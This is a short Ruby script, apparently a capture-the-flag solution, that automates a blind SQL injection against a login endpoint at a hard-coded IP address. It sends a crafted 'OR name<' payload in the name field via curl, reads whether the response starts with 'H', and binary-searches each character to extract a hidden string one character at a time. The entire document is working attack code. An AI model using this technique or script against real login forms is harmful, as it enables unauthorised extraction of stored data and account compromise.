s = ''

200.times do
  min = ' '.ord
  max = '~'.ord

  while max - min > 1
    mid = (min + max) / 2

    p t = s + mid.chr

    p h = `curl 'http://35.196.211.56:8002/login' --data 'name=%22+OR+name<%22#{t}%22+--&password='`

    if h[0] == ?H
      max = mid
    else
      min = mid
    end
    sleep 0.5
  end

  s << min.chr
  p s
end

